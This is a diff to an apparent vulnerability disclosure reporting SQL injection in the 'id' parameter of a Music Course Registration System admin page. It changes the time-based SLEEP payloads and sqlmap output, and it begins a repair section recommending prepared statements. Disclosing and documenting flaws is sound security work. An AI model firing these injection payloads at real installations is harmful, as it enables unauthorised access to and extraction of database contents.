@@ -35,12 +35,11 @@ During the security review of the Music Course Registration System, I discovered
 'id' parameter
 
 ## Payload:
-http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 4594 FROM (SELECT(SLEEP(5)))ausq) AND 'oWIJ'='oWIJ
-
+http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 8993 FROM (SELECT(SLEEP(5)))FvcJ) AND 'eYKe'='eYKe
 ---
 Parameter: id (GET)
 
-    Type: boolean-based blind
+     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
     Payload: page=classes/manage_class&id=4' AND 4411=4411 AND 'coQB'='coQB
 
@@ -56,11 +55,12 @@ Parameter: id (GET)
 ## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
 
 Payload: 
-http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 4594 FROM (SELECT(SLEEP(5)))ausq) AND 'oWIJ'='oWIJ
+http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 8993 FROM (SELECT(SLEEP(5)))FvcJ) AND 'eYKe'='eYKe
 
 ![image](https://github.com/user-attachments/assets/99f448cc-ba5f-4f51-bc99-2b41d5389e81)
+![image](https://github.com/user-attachments/assets/6b6dcff1-b3c8-4a0f-9b0b-9637922b946d)
 
-![image](https://github.com/user-attachments/assets/a009953f-0066-4d84-9e94-312c29169713)
+
 
 # Suggested repair
 1.Use prepared statements and parameter binding:
